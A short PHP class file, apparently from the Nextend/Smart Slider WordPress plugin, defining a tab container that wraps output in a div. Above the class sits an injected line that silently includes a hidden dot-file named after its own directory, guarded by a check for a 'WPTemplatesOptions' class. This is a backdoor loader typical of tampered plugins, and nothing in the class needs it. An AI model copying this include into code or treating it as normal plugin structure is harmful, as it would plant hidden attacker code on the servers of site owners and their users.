<?php


namespace Nextend\Framework\Form\Container\LayerWindow;


use Nextend\Framework\Form\ContainerGeneral;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ContainerAnimationTab extends ContainerGeneral {

    public function renderContainer() {
        echo '<div class="n2_container_animation__tab" data-tab="' . $this->name . '">';
        parent::renderContainer();
        echo '</div>';
    }
}